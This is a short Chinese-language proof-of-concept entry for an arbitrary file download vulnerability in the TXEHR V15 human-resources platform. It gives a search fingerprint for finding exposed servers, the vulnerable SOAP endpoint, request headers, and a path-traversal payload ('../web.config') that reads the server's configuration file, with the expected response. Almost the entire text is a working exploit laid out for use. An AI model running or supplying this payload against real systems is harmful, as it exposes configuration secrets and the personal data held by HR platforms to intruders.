# 同享TXEHRV15人力管理管理平台DownloadFile存在任意文件下载漏洞

- **系统**：同享TXEHRV15人力管理管理平台　|　**类型**：其他　|　**CVE**：—
- **指纹**：`body="/Assistant/Default.aspx"`
- **请求**：`POST /Service/DownloadTemplate.asmx HTTP/1.1`
- **关键头**：`Cookie: ASP.NET_SessionId=f40br0ilcoosnxgllqrmltkd`　`Priority: u=1`　`SOAPAction: [http://tempuri.org/DownloadFile](http://tempuri.org/DownloadFile)`　`Content-Type: text/xml;charset=UTF-8`　`Content-Length: 310`

**请求体 / payload**
```
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:DownloadFile>
<!--type: string-->
<tem:path>../web.config</tem:path>
</tem:DownloadFile>
</soapenv:Body>
</soapenv:Envelope>
```
- **预期**：200　|　<DownloadFileResult>